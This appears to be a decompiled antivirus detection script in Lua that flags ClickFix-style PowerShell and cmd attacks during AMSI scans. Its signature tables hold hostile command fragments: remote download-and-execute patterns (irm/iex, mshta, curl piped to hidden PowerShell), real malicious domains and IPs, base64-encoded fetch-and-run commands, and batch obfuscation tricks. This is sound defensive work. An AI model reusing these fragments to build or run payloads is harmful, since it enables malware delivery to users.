-- Threat: Trojan:PowerShell/ClickFix.SVL
-- Type: 13
-- Includes: LuaFuncHelper, ResearchData
-- MpAttributes: (MpPowershellAmsiViaCmdLine | MpIsWindowsTerminalAMSI)

if mp.get_contextdata(mp.CONTEXT_DATA_SCANREASON) ~= mp.SCANREASON_AMSI then
  return mp.CLEAN
end
local l_0_0 = mp.getfilesize()
if l_0_0 == nil or l_0_0 < 16 or 16384 < l_0_0 then
  return mp.CLEAN
end
mp.readprotection(false)
local l_0_1, l_0_2 = pcall(mp.readfile, 0, l_0_0)
mp.readprotection(true)
if not l_0_1 or type(l_0_2) ~= "string" or #l_0_2 ~= l_0_0 then
  return mp.CLEAN
end
local l_0_3 = l_0_2
if string.find(string.sub(l_0_3, 1, 64), string.char(0), 1, true) then
  local l_0_4, l_0_5 = pcall(mp.utf16to8, l_0_3)
  if not l_0_4 or type(l_0_5) ~= "string" then
    return mp.CLEAN
  end
  l_0_3 = l_0_5
end
if #l_0_3 < 16 or 8192 < #l_0_3 then
  return mp.CLEAN
end
local l_0_6 = string.lower(l_0_3)
local l_0_7 = ""
if mp.get_mpattribute("MpIsPowerShellAMSIScan") then
  l_0_7 = ClassifyClickFixExecution(l_0_3, false)
  if l_0_7 == "lowfi" then
    mp.set_mpattribute("Lua:ClickFixExecSA")
  end
end

local function l_0_8(l_1_0, l_1_1)
  local l_1_2 = {}
  for l_1_3 = 1, #l_1_1, 2 do
    local l_1_4 = {}
    local l_1_5 = 1
    local l_1_6 = 1
    while true do
      local l_1_7, l_1_8 = string.find(l_1_0, l_1_1[l_1_3], l_1_6, true)
      if l_1_7 == nil then
        break
      end
      if l_1_3 == 1 then
        l_1_4[#l_1_4 + 1] = l_1_8
      else
        while l_1_5 < #l_1_2 and l_1_7 > l_1_2[l_1_5 + 1] do
          l_1_5 = l_1_5 + 1
        end
        local l_1_9 = l_1_2[l_1_5]
        if l_1_7 > l_1_9 and l_1_7 - l_1_9 - 1 <= l_1_1[l_1_3 - 1] then
          l_1_4[#l_1_4 + 1] = l_1_8
        end
      end
      l_1_6 = l_1_7 + 1
    end
    if next(l_1_4) == nil then
      return false
    end
    l_1_2 = l_1_4
  end
  return true
end

local l_0_9 = {
  {
    ".((write ie)+'zx'[1])",
    16,
    "(irm 1476085201/"
  },
  {
    "for /r \"",
    64,
    "\\google\\chrome\\user data\"",
    32,
    "in (f_*) do @if %~z",
    4,
    "==",
    16,
    "ren \"",
    32,
    ".vbs",
    16,
    "wscript ",
    64,
    ".vbs"
  },
  {
    "for /r \"",
    64,
    "\\microsoft\\edge\\user data\"",
    32,
    "in (f_*) do @if %~z",
    4,
    "==",
    16,
    "ren \"",
    32,
    ".vbs",
    16,
    "wscript ",
    64,
    ".vbs"
  },
  {
    "for /r \"",
    64,
    "\\google\\chrome\\user data\"",
    32,
    "in (f_*) do @if %~z",
    4,
    "==",
    16,
    "copy \"",
    64,
    ".vbs",
    64,
    "wscript ",
    64,
    ".vbs"
  },
  {
    "for /r \"",
    64,
    "\\microsoft\\edge\\user data\"",
    32,
    "in (f_*) do @if %~z",
    4,
    "==",
    16,
    "copy \"",
    64,
    ".vbs",
    64,
    "wscript ",
    64,
    ".vbs"
  },
  {
    "irm 'http",
    255,
    "-useragent 'wua/",
    32,
    "-headers @{'x-wua'='",
    128,
    ")|",
    8,
    "iex"
  }
}
local l_0_10
if l_0_7 == "block" then
  l_0_10 = -1
elseif string.find(l_0_3, "LgAoACgAdwByAGkAdABlACAAaQBlACkAKwAnAHoAeAAnAFsAMQBdACkAKABpAHIAbQAgADEANAA3ADYAMAA4ADUAMgAwADEALw", 1, true) then
  l_0_10 = 0
else
  for l_0_11, l_0_12 in ipairs(l_0_9) do
    if l_0_8(l_0_6, l_0_12) then
      l_0_10 = l_0_11
      break
    end
  end
end
local l_0_13 = {
  {
    "%comspec%\" /c start \"\" /min for /f \"delims=@\"",
    255,
    "do %t"
  },
  {
    "comspec% /c start \"\" /min for /f \"delims=@\"",
    255,
    "do %t"
  },
  {
    "start \"\" /min cmd /d /v:on /q /c \"cd /d %temp%"
  },
  {
    "('where *wershell')do start /min"
  },
  {
    "%comspec% /c start \"\" /min %comspec% /c %comspec% /v:on /c",
    48,
    "%localappdata%",
    128,
    ".hta"
  },
  {
    "irm 1450003207/",
    48,
    "$env:temp"
  },
  {
    "irm 392073696/",
    48,
    "$env:temp"
  },
  {
    "irm 35387519/",
    48,
    "$env:temp"
  },
  {
    "irm 1614733393/",
    48,
    "$env:temp"
  },
  {
    "irm 392073560/",
    48,
    "$env:temp"
  },
  {
    "$env:tmp;irm 2549127135/"
  },
  {
    string.lower("SW52b2tlLVdlYlJlcXVlc3QgJ2h0dHA6Ly8xNjYuMS44OS45MS96YXAvJyAtVXNlQmFzaWNQYXJzaW5nIHwgSW52b2tlLUV4cHJlc3Npb24=")
  },
  {
    string.lower("SW52b2tlLVdlYlJlcXVlc3QgJ2h0dHA6Ly8xNjYuMS44OS45MS9fLycgLVVzZUJhc2ljUGFyc2luZyB8IEludm9rZS1FeHByZXNzaW9u")
  },
  {
    string.lower("aQByAG0AIABoAHQAdABwADoALwAvADEANgA2AC4AMQAuADgAOQAuADkAMQAvAF8AfABpAGUAeAA=")
  },
  {
    string.lower("aQByAG0AIABoAHQAdABwADoALwAvADEANgA2AC4AMQAuADgAOQAuADkAMQAvAHoAYQBwAHwAaQBlAHgA")
  },
  {
    "mshta",
    48,
    "https://1902-cf.com"
  },
  {
    "mshta",
    48,
    "https://",
    8,
    "-cf.com"
  },
  {
    "4fb-ff/c19e1173-a40b-4198-b705-b85466f6cde0/119-73c4846d6ec9"
  },
  {
    "irm",
    16,
    "steam.run",
    16,
    "iex"
  },
  {
    "$env:temp",
    255,
    "iwr",
    255,
    "volanteomaleta.cl"
  },
  {
    "'msxml2.xmlhttp",
    255,
    "iex(gc $env:tmp",
    48,
    "rm $env:tmp"
  },
  {
    "irm c\"d\"n.jsdelivr.net/g\"h\"/"
  },
  {
    "holtandberyl.com/prw"
  },
  {
    "power!power! -nop -c iex(irm !a!!b!!c!!d!)"
  },
  {
    "do set data=!data!!code:~%t,1!)"
  },
  {
    "do set item=!item!!code:~%i,1!)"
  },
  {
    "do set item=!item!!note:~%t,1!)"
  },
  {
    "do set text=!text!!note:~%t,1!)"
  },
  {
    "do set body=!body!!ref:~%n,1!)"
  },
  {
    "do set text=!text!!ref:~%n,1!)"
  },
  {
    "do set text=!text!!code:~%",
    16,
    ",1!)"
  },
  {
    "%localappdata%\\",
    128,
    "do @if %~zf==",
    48,
    "copy \"%f\" %temp%\\",
    48,
    "wscript",
    48,
    ".vbs"
  },
  {
    "[net.servicepointmanager]::securityprotocol=[net.securityprotocoltype]::tls12;",
    255,
    "-usebasicparsing -outfile $env:temp\\123.ps1"
  },
  {
    "do set item=!item!!mark:~%",
    8,
    ",1!)",
    16,
    "& set item=!item:@= !"
  },
  {
    "start \"\" /m^i^n for /f \"delims=@\"",
    16,
    "f^^i^^n^^g^^e^^r",
    128,
    "') do "
  },
  {
    "start \"\" /m^i^n for /f \"delims=\"",
    16,
    "('where finger') do for /f \"delims=\"",
    128,
    "do @%"
  },
  {
    "irm 'https://",
    255,
    "-useragent 'wua/",
    32,
    "-headers @{'x-wua'='"
  },
  {
    "%comspec% /c start \"\"",
    80,
    "/m^i^n for /f \"delims="
  },
  {
    "%temp%",
    255,
    "https://cloubflare.net/"
  },
  {
    "https://gfisoda.biz/"
  },
  {
    "curl.exe -fsL --ssl-no-revoke --retry 8 --retry-connrefused --retry-delay 1 --connect-timeout",
    255,
    "-o \"%temp%",
    255,
    "&& powershell -w h"
  },
  {
    "%comspec% /c %comspec% /c %comspec% /c start \"\" /^min for /f \"delims=\""
  },
  {
    "set a=power&set b=shell&curl.exe"
  }
}
local l_0_14
if l_0_10 ~= nil then
  l_0_14 = l_0_10
elseif l_0_8(l_0_6, {
  "powershell",
  16,
  " -w h",
  16,
  "irm"
}) and string.find(l_0_6, "|powershell -w h", 1, true) and string.find(l_0_6, "gg.ps1", 1, true) then
  l_0_14 = 0
else
  for l_0_15, l_0_16 in ipairs(l_0_13) do
    if l_0_8(l_0_6, l_0_16) then
      l_0_14 = l_0_15
      break
    end
  end
end
if l_0_10 == nil and l_0_14 == nil then
  return mp.CLEAN
end
local l_0_17 = "-"
local l_0_18 = ""
local l_0_19 = "-"
local l_0_20 = "direct"
if l_0_10 == nil then
  local l_0_21 = {
    "IsClickFixCMD",
    "IsClickFixCMD_Malicious"
  }
  local l_0_22
  l_0_22, l_0_17, l_0_18, l_0_19, l_0_20 = FindRollingQueueContentMatch(l_0_21, l_0_3)
  if not l_0_22 then
    return mp.CLEAN
  end
end
local l_0_23 = tostring(l_0_14) .. "||" .. tostring(l_0_20) .. "||" .. tostring(l_0_17) .. "||" .. string.sub(tostring(l_0_19 or "-"), 1, 128) .. "||" .. string.sub(tostring(l_0_18), 1, 320) .. "||" .. string.sub(l_0_3, 1, 320)
set_research_data("ClickFix_SVL", l_0_23, false)
return mp.INFECTED
